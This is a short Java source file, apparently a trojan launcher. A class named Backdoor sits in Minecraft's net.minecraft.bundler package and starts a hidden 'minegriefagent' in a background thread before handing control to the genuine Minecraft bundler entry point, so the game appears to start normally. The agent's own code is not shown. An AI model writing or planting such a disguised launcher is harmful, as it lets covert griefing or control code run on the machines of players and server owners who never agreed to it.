package net.minecraft.bundler;

public class Backdoor {
    public static void main(String[] argv) {
        new Thread(new Runnable() {
            public void run() {
                com.chebuya.minegriefagent.Main.main(argv);
            }
        }).start();

        net.minecraft.bundler.Main.main(argv);
    }
}
